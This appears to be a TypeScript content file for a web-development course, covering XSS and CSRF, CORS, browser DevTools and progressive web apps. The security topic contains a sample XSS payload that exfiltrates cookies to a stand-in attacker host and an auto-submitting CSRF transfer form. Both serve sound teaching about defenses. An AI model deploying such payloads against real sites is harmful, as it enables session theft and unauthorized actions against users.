import type { Topic } from "../../types/content";

export const webFundamentalsAdvancedTopics: Topic[] = [
  {
    id: "web-security-basics",
    title: "Web Security Basics",
    level: "advanced",
    description:
      "Two of the most common ways attackers abuse a website's trust of its own content or its users, and why they work.",
    explanation: `
A lot of web security problems boil down to one core issue: a browser
generally trusts whatever content it's given, and a server generally
trusts requests that look like they came from a legitimate, logged-in
user. Attackers exploit that trust in two classic ways.

The first: imagine a site lets users post comments, and it displays
those comments back to other visitors exactly as typed, without
checking what's in them. If an attacker posts a comment that's actually
a small piece of JavaScript instead of plain text, and the site
displays it without neutralizing it, that script runs in every other
visitor's browser as if the *site itself* had written it — able to
steal their session, read their data, or act as them. This is called
**cross-site scripting**, or **XSS**: sneaking attacker-controlled code
into a page so it runs with the page's own trust and permissions.

The second: imagine you're logged into your bank in one browser tab,
and in another tab you visit a malicious page. That malicious page
secretly submits a request to your bank — say, a money transfer —
using your browser. Because your browser automatically attaches your
login cookie to *any* request it sends to the bank's domain, regardless
of which tab triggered it, the bank's server sees what looks like a
perfectly legitimate, authenticated request from you, and might act on
it. This is called **cross-site request forgery**, or **CSRF**: tricking
a victim's already-authenticated browser into sending a request the
victim never actually intended to make.

The common thread in both: something ends up running or being trusted
that the actual user never knowingly approved.
  `.trim(),
    analogy:
      "XSS is like a forger slipping a fake page into a book that everyone reads as if it were the real, trusted author's words. CSRF is like someone tricking you into signing a blank check while you're not paying attention, then filling in whatever amount they want, knowing your signature (your login session) is already valid.",
    examples: [
      {
        title: "An XSS vulnerability",
        code: `// Comment submitted by an attacker:
<script>fetch('https://evil.example/steal?cookie=' + document.cookie)</script>

// If the site inserts this directly into the page HTML unescaped,
// this script runs in every visitor's browser who views the comment.`,
        explanation:
          "The attacker isn't hacking the server directly — they're getting the site to unknowingly serve the attacker's own script to other victims, which then runs with full access to that page, including reading cookies.",
        walkthrough: [
          { code: "<script>...</script>", explanation: "This isn't plain text — it's a real, executable script, submitted as if it were an ordinary comment." },
          { code: "fetch('https://evil.example/steal?...')", explanation: "Sends the victim's own session data to a server controlled by the attacker." },
          { code: "document.cookie", explanation: "Reads the current page's cookies — which, if this is the victim's logged-in session, could include their session identifier." },
        ],
      },
      {
        title: "A CSRF request",
        code: `<!-- Hosted on a malicious, unrelated site -->
<form action="https://bank.example/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById("f").submit();</script>`,
        explanation:
          "Just visiting this malicious page silently submits a form to the bank's real server. If the victim is currently logged into the bank in the same browser, their session cookie is attached automatically, and the bank may process it as a legitimate request.",
      },
    ],
    howItWorks: `
XSS works because a browser can't tell the difference between "content
the site's own developers wrote" and "content a user submitted that
happens to look like code," unless the site explicitly neutralizes
special characters before displaying user-submitted content back on the
page (a process often called **escaping** or **sanitizing**). CSRF
works because browsers automatically attach cookies for a domain to
*every* request sent to that domain, no matter which page or tab
initiated the request — the browser has no built-in way to know the
request wasn't something the user actually intended.
  `.trim(),
    whyItExists: `
Both attacks exist because trust on the web is based on patterns
(this content is in the page, so treat it as the page's own; this
request carries valid cookies, so treat it as the real user) that are
easy for an attacker to exploit if a site doesn't defend against them
directly. Understanding the plain mechanics of each attack is what
makes the defenses against them (like escaping output, and requiring
extra unpredictable tokens on sensitive requests) make sense, rather
than feeling like arbitrary rules.
  `.trim(),
    whenToUse: `
Think about XSS anywhere your site displays content that came from a
user — a comment, a username, a search term — rather than content your
own developers wrote. Think about CSRF anywhere your site performs a
meaningful action (changing a password, transferring money, deleting
data) in response to a request, especially one relying only on cookies
to identify the user.
  `.trim(),
    whenNotToUse: `
These specific concerns are about a browser-based, cookie-and-content
model. They don't map directly to systems with no browser or no shared
session trust between requests, like a server-to-server API using
signed tokens for every call — though those systems have their own,
different security concerns to think through instead.
  `.trim(),
    commonMistakes: [
      "Displaying user-submitted content directly in the page without escaping special characters, opening the door to XSS.",
      "Assuming a valid session cookie alone proves a request was intentionally made by the user, which is exactly what CSRF exploits.",
      "Treating security as something to bolt on at the end, rather than something to consider whenever user input is displayed or a sensitive action is performed.",
    ],
    exercises: [
      { difficulty: "Easy", prompt: "In your own words, explain the difference between what XSS and CSRF actually get an attacker to do." },
      { difficulty: "Medium", prompt: "Given a comment form that inserts user input directly into the page's HTML, describe exactly what a malicious comment could do to other visitors." },
      { difficulty: "Hard", prompt: "Design a simple defense for a form-submission endpoint that would prevent the CSRF example above from succeeding, and explain why it works." },
    ],
    interviewQuestions: [
      { question: "What is cross-site scripting (XSS), in plain terms?", answer: "Getting a website to display and run attacker-supplied code as if it were the site's own trusted content, typically by injecting it into content the site later renders unescaped." },
      { question: "What is cross-site request forgery (CSRF), in plain terms?", answer: "Tricking a victim's browser into sending a request to a site the victim is already logged into, so the request looks legitimate because the browser automatically attaches the victim's session cookie." },
      { question: "Why does a valid session cookie alone not prove a request was intentional?", answer: "Because browsers attach cookies to any request sent to a matching domain regardless of which page triggered it, so an attacker's page can cause the browser to send a fully authenticated-looking request the user never meant to make." },
    ],
    relatedTopics: ["cors", "browser-storage"],
    keywords: ["xss", "csrf", "security", "cross-site scripting", "cross-site request forgery"],
  },
  {
    id: "cors",
    title: "CORS",
    level: "advanced",
    description:
      "Why a browser blocks a webpage from freely talking to a different website's server, and how that server can explicitly allow it.",
    explanation: `
By default, a browser is deliberately suspicious of a webpage that
tries to fetch data from a *different* website than the one it was
loaded from. If a page at \`shopping.example\` tries to make a request
to \`bank.example\`, the browser will, by default, block the page from
reading the response — even if the request itself technically went
through — because there's no reason to assume \`bank.example\` wants
some random other site reading its data on a visitor's behalf.

This default blocking is called the **same-origin policy**, and it's a
core browser security protection. But plenty of legitimate use cases
need exactly this kind of cross-site request — a public weather API
that many different websites are meant to call, for example. So there
needs to be a way for a server to say "actually, it's fine, this
specific other site is allowed to read my responses."

That mechanism is called **CORS** — Cross-Origin Resource Sharing. A
server that wants to allow requests from other origins includes
specific response headers saying so, and the browser checks those
headers before deciding whether to let the requesting page's JavaScript
actually read the response. Without the right headers present, the
browser blocks access to the response even though the server already
sent it.
  `.trim(),
    analogy:
      "It's like a delivery being physically dropped off at your door, but you (the browser) refuse to let the person inside the house read what's in the package unless the sender included a note saying 'yes, this address is allowed to open it.'",
    examples: [
      {
        title: "A blocked cross-origin request",
        code: `// Running on https://myapp.example
fetch("https://api.otherservice.example/data")
  .then(res => res.json())
  .catch(err => console.error(err));
// Console: blocked by CORS policy — no
// 'Access-Control-Allow-Origin' header present`,
        explanation:
          "The request may well have reached the server and gotten a response, but the browser refuses to hand that response's data to this page's JavaScript because the server didn't explicitly allow this origin.",
        walkthrough: [
          { code: "https://myapp.example", explanation: "The 'origin' this script is running from — the combination of protocol, domain, and port." },
          { code: 'fetch("https://api.otherservice.example/data")', explanation: "A request to a different origin — different domain — which triggers a CORS check by the browser." },
          { code: "blocked by CORS policy", explanation: "The browser withheld the response from this page's JavaScript because the server's response didn't include permission for this specific origin." },
        ],
      },
      {
        title: "A server opting in",
        code: `HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://myapp.example
Content-Type: application/json

{"forecast": "sunny"}`,
        explanation:
          "By including this header naming the exact origin allowed to read the response, the server tells the browser it's fine for https://myapp.example specifically to access this data. A value of * would allow any origin at all.",
      },
    ],
    howItWorks: `
When JavaScript on one origin makes a request to a different origin,
the browser attaches the requesting page's origin to the request and
then inspects the response headers before deciding whether to expose
the response body to that page's JavaScript. If the server's response
includes an \`Access-Control-Allow-Origin\` header matching the
requesting origin (or a wildcard allowing any origin), the browser lets
the request through; otherwise, it blocks access to the response, even
though the network request itself may have completed successfully. For
certain kinds of requests, the browser first sends an automatic
"preflight" check — a separate request asking the server what's allowed
— before sending the real one.
  `.trim(),
    whyItExists: `
CORS exists because the same-origin policy, while essential for
security, was too restrictive for the many legitimate cases where sites
genuinely need to share data across origins — public APIs, third-party
widgets, services split across multiple domains. CORS gives servers an
explicit, opt-in way to loosen that restriction only where they choose
to, rather than the browser blocking everything cross-origin
unconditionally or removing the protection altogether.
  `.trim(),
    whenToUse: `
You'll need to configure CORS anytime a browser-based frontend on one
origin needs to call an API hosted on a different origin — a common
setup, and something you'll set up on the *server* side, since it's the
server's headers that grant permission.
  `.trim(),
    whenNotToUse: `
CORS isn't relevant for requests made from a server to another server
(no browser is involved, so there's no same-origin policy to enforce),
and it isn't a substitute for actual authentication or authorization —
allowing an origin via CORS only controls whether a browser can read
the response; it says nothing about whether the request itself should
be trusted or permitted for other reasons.
  `.trim(),
    commonMistakes: [
      "Assuming a CORS error means the request never reached the server, when the server may have processed it fine — the browser is only blocking the response from being read.",
      "Setting Access-Control-Allow-Origin to * on an API that also handles sensitive, authenticated requests, which can be an overly permissive default.",
      "Confusing CORS with a security feature that protects the server — it's actually a browser-enforced protection for the calling page and its users.",
    ],
    exercises: [
      { difficulty: "Easy", prompt: "In your own words, explain why the same-origin policy blocks a page's JavaScript from reading a cross-origin response by default." },
      { difficulty: "Medium", prompt: "Given a fetch request that fails with a CORS error, list the response header that would need to be added on the server to fix it, naming the specific allowed origin." },
      { difficulty: "Hard", prompt: "Explain what a CORS preflight request is, why it's necessary for some requests but not others, and sketch what a server would need to respond with to satisfy it." },
    ],
    interviewQuestions: [
      { question: "What problem does the same-origin policy solve?", answer: "It prevents a webpage's JavaScript from freely reading responses from a different origin's server by default, protecting users from malicious pages silently reading data from other sites they happen to be logged into." },
      { question: "What is CORS, and who configures it?", answer: "Cross-Origin Resource Sharing — a mechanism where a server includes response headers explicitly permitting specific other origins to read its responses. It's configured on the server, not the requesting page." },
      { question: "If a request fails due to CORS, did the server actually receive it?", answer: "Often yes — the request can reach the server and get processed normally; the browser is what blocks the calling page's JavaScript from reading the response, because the server didn't grant permission via the right header." },
    ],
    prerequisites: ["how-the-web-works"],
    relatedTopics: ["web-security-basics", "how-the-web-works"],
    keywords: ["cors", "same-origin policy", "cross-origin", "access-control-allow-origin", "preflight"],
  },
  {
    id: "browser-devtools",
    title: "Browser DevTools & Debugging",
    level: "advanced",
    description:
      "The built-in browser tools for inspecting, debugging, and understanding exactly what a page is doing, beyond just what it shows.",
    explanation: `
Every major browser ships with a set of built-in tools, usually opened
with a keyboard shortcut or a right-click "Inspect," collectively
called **DevTools**. They exist because a webpage's visible output
often isn't enough to understand or fix a problem — you need to see
the actual structure underneath, watch code run, inspect network
traffic, or catch errors as they happen.

A few panels come up constantly. The **Elements** panel shows the live
DOM tree (not the original HTML source) along with the computed CSS
for whatever element you select, and lets you edit either on the fly to
experiment. The **Console** panel shows messages logged by JavaScript,
reports errors and warnings as they occur, and doubles as a live
JavaScript prompt where you can run code directly against the current
page. The **Network** panel lists every request the page has made —
what was requested, how long it took, what came back — which is
usually the first place to look when something isn't loading or is
loading slowly. The **Sources** panel shows the actual JavaScript files
running on the page and lets you set **breakpoints** — points where
execution pauses so you can inspect variables and step through code
line by line, rather than guessing what's happening from logs alone.
  `.trim(),
    analogy:
      "DevTools is like popping the hood of a car instead of just looking at the dashboard — the dashboard (the rendered page) tells you the car is running, but the hood lets you see exactly which part is actually misbehaving.",
    examples: [
      {
        title: "Inspecting and editing the live DOM",
        code: `// In the Elements panel, selecting an element shows
// its live HTML and the CSS rules currently applied to it.
// Editing text or a style there updates the page instantly,
// without changing any actual file on disk.`,
        explanation:
          "This is a fast way to test a visual tweak — try a new color or margin live in the browser — before actually writing it into a CSS file, since it's the live DOM being edited, not the source.",
      },
      {
        title: "Setting a breakpoint in Sources",
        code: `function calculateTotal(items) {
  let total = 0;
  for (const item of items) {
    total += item.price; // <- breakpoint set on this line
  }
  return total;
}`,
        explanation:
          "Setting a breakpoint on the marked line pauses execution every time that line is about to run, letting you inspect the current values of total and item right there, rather than sprinkling console.log statements throughout the code.",
        walkthrough: [
          { code: "function calculateTotal(items) {", explanation: "The function whose behavior you're trying to understand or debug." },
          { code: "total += item.price; // breakpoint", explanation: "Clicking the line number here in the Sources panel pauses execution exactly at this point, every time it runs." },
          { code: "(paused execution)", explanation: "While paused, you can inspect the current value of every variable in scope, and step forward one line at a time to watch how they change." },
        ],
      },
    ],
    howItWorks: `
DevTools is built directly into the browser and has privileged access
to the page's internals: it can read the live DOM and its computed
styles directly (Elements), tap into the JavaScript engine to log
messages, catch errors, and run arbitrary code in the page's context
(Console), observe every network request the page's engine makes
(Network), and pause the JavaScript engine's execution at specific
lines (Sources). None of this requires the page itself to include any
special debugging code — the browser exposes it for every page by
default.
  `.trim(),
    whyItExists: `
DevTools exists because "look at the rendered page" isn't nearly enough
information to build or fix anything nontrivial — you need visibility
into structure, styling, network activity, and code execution that
never shows up in the rendered output itself. Having this built into
every browser, available on any page, makes debugging a normal part of
using the web platform rather than something requiring separate,
specialized tools.
  `.trim(),
    whenToUse: `
Reach for the Elements panel when something looks visually wrong and
you need to see the actual applied styles. Reach for Console when
checking for errors or quickly testing a snippet of code. Reach for
Network when something isn't loading, is loading slowly, or you need
to inspect what a request actually sent or received. Reach for Sources
and breakpoints when you need to understand exactly what a piece of
JavaScript is doing step by step, rather than guessing from behavior
alone.
  `.trim(),
    whenNotToUse: `
DevTools is a debugging and inspection tool, not a way to permanently
change a site — anything edited live in the Elements or Sources panel
disappears the moment the page reloads, since none of it touches actual
source files. For understanding intended, permanent behavior, reading
the actual source code remains the source of truth.
  `.trim(),
    commonMistakes: [
      "Editing something in the Elements panel and expecting the change to persist after a page reload, when live edits vanish on refresh.",
      "Ignoring the Network panel when debugging a 'blank page' or missing-data issue, when a failed or slow request is often the actual cause.",
      "Relying only on scattered console.log statements for a tricky bug instead of using a breakpoint to pause and inspect state directly.",
    ],
    exercises: [
      { difficulty: "Easy", prompt: "Open DevTools on any webpage, select an element in the Elements panel, and identify one CSS rule currently applied to it." },
      { difficulty: "Medium", prompt: "Open the Network panel, reload a page, and find the single largest resource that was downloaded." },
      { difficulty: "Hard", prompt: "Set a breakpoint inside a JavaScript function on a real page, trigger it, and step through the code line by line while watching a variable's value change." },
    ],
    interviewQuestions: [
      { question: "What's the difference between the Elements panel and viewing a page's HTML source?", answer: "The Elements panel shows the live, current DOM (which may have been changed by JavaScript since the page loaded), while 'view source' shows the original, static HTML as it was first sent by the server." },
      { question: "What is a breakpoint, and why use one instead of console.log?", answer: "A breakpoint pauses JavaScript execution at a specific line so you can inspect all current variable values and step through code, which is often faster and more thorough than adding and removing scattered log statements." },
      { question: "When would you check the Network panel while debugging?", answer: "Whenever something isn't appearing, is loading slowly, or you need to verify exactly what data a request sent or received — it's the primary place to see all network activity a page has triggered." },
    ],
    relatedTopics: ["the-dom", "browser-rendering", "web-performance-basics"],
    keywords: ["devtools", "debugging", "elements panel", "console", "network panel", "breakpoints"],
  },
  {
    id: "progressive-web-apps",
    title: "Progressive Web Apps (PWA)",
    level: "advanced",
    description:
      "What lets an ordinary website behave more like a native app — installable, working offline, and launchable from a home screen.",
    explanation: `
A regular website generally needs a live network connection and lives
only inside a browser tab. But some sites are built to go further: they
can be "installed" onto a device like a native app, keep working (at
least partially) with no internet connection, and show up with their
own icon outside the browser entirely. A site built this way is called
a **Progressive Web App**, or **PWA** — "progressive" because it starts
as a normal website and layers these app-like capabilities on top,
rather than requiring a totally separate app to be built.

Two pieces make this possible. A **manifest file** is a small JSON file
that describes the site as an app would describe itself — its name, its
icon, its color scheme, and how it should look when launched (like
hiding the browser's address bar). It's what lets a browser offer to
"install" the site and lets the resulting icon look and behave like any
other app icon.

The other piece is a **service worker** — a special script that a
browser can run in the background, separately from any particular open
tab, even when no tab for that site is open at all. A service worker
can intercept the network requests a page makes and decide how to
respond — including serving a previously saved response instead of
hitting the network at all, which is exactly what lets a PWA keep
working, at least partially, with no connection.
  `.trim(),
    analogy:
      "A manifest file is like a business card the site hands the operating system, saying 'here's my name, my icon, and how I want to be launched.' A service worker is like a receptionist who keeps working at the desk even when the office (an open tab) is empty, and who keeps a filing cabinet of past documents to hand out instantly instead of always calling out for a fresh copy.",
    examples: [
      {
        title: "A basic web app manifest",
        code: `{
  "name": "My Task App",
  "short_name": "Tasks",
  "start_url": "/",
  "display": "standalone",
  "icons": [
    { "src": "icon-192.png", "sizes": "192x192", "type": "image/png" }
  ]
}`,
        explanation:
          "This JSON file, linked from the page's HTML, is what tells the browser this site can be installed as an app, what icon to use, and that it should open without the usual browser address bar (display: standalone).",
        walkthrough: [
          { code: '"name": "My Task App"', explanation: "The full app name shown during installation and in app switchers." },
          { code: '"display": "standalone"', explanation: "Tells the browser to launch this app in its own window, without the normal browser chrome like the address bar." },
          { code: '"icons": [...]', explanation: "Specifies the icon image(s) used for the home screen or app launcher, at the given sizes." },
        ],
      },
      {
        title: "A service worker caching a response",
        code: `self.addEventListener("fetch", (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) => {
      return cached || fetch(event.request);
    })
  );
});`,
        explanation:
          "This service worker intercepts every network request the page makes. If a matching response was previously saved in the cache, it's returned immediately, even offline; otherwise, the service worker falls back to an actual network request.",
      },
    ],
    howItWorks: `
Once a page registers a service worker, the browser installs it to run
independently of any specific tab, in the background, and it stays
registered across visits. From then on, the service worker can listen
for network requests the page makes and intercept them before they
reach the network at all, deciding whether to serve a saved (cached)
response, fetch a fresh one, or some combination — which is what
enables offline support. The manifest file is used separately, mainly
at install time, to tell the operating system how to present the app
once a user chooses to install it.
  `.trim(),
    whyItExists: `
PWAs exist to close the gap between websites and native apps without
requiring a completely separate native app to be built and maintained
for each platform. Offline support and installability were previously
things only native apps could offer; service workers and manifest files
let an ordinary website opt into those same capabilities using
technology already built into the browser.
  `.trim(),
    whenToUse: `
Consider a PWA when users would benefit from installing your site like
an app, or when your app needs to remain at least partially usable
without a reliable internet connection — a good fit for things like
note-taking apps, dashboards checked frequently, or tools used in
places with patchy connectivity.
  `.trim(),
    whenNotToUse: `
A simple content site with no real need for offline access or an app-
like presence gains little from the added complexity of a service
worker and manifest. Service workers also add real complexity around
caching and updates — content served from a stale cache can confuse
users if not managed carefully, so they're not worth adopting casually.
  `.trim(),
    commonMistakes: [
      "Caching responses aggressively in a service worker without a plan for invalidating old data, leaving users stuck seeing stale content.",
      "Assuming adding a manifest file alone makes a site work offline — that capability comes from the service worker, not the manifest.",
      "Forgetting that a registered service worker keeps running and intercepting requests even after the user closes the tab, which can surprise you during development if you don't account for it.",
    ],
    exercises: [
      { difficulty: "Easy", prompt: "Write a basic web app manifest file for a sample site, including a name, icon, and display mode." },
      { difficulty: "Medium", prompt: "Register a simple service worker on a test page and confirm, using DevTools, that it's running independently of the open tab." },
      { difficulty: "Hard", prompt: "Extend a service worker to cache a page's core files on install and serve them when the network is unavailable, then test it by going offline in DevTools." },
    ],
    interviewQuestions: [
      { question: "What are the two core pieces that make a website installable and offline-capable as a PWA?", answer: "A web app manifest file, which describes the app's name, icon, and launch appearance, and a service worker, which can intercept network requests and serve cached responses even without a connection." },
      { question: "What is a service worker, and how is it different from regular page JavaScript?", answer: "A service worker is a script that runs in the background, independently of any specific open tab, and can intercept and respond to the page's network requests — unlike regular page scripts, which only run while their tab is open." },
      { question: "Does adding a manifest file alone make a site work offline?", answer: "No. The manifest only controls installability and how the app is presented once installed; offline behavior comes from a service worker intercepting requests and serving cached responses." },
    ],
    prerequisites: ["browser-devtools", "web-performance-basics"],
    relatedTopics: ["browser-devtools", "browser-storage"],
    keywords: ["pwa", "progressive web app", "service worker", "manifest", "offline", "installable"],
  },
];
